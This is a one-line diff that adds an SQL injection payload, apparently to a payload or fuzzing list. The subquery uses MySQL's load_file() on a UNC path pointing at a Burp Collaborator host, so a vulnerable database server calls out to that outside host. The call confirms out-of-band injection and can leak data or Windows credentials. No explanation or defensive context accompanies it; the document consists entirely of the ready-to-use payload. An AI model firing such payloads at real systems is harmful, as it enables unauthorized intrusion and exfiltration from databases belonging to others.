@@ -1,0 +1,1 @@
+(select load_file('\\\\0kl45l0usnbusl0h927ed7s6zx5qtjk7b9z1muaj.burpcollaborator.net\\gis'))
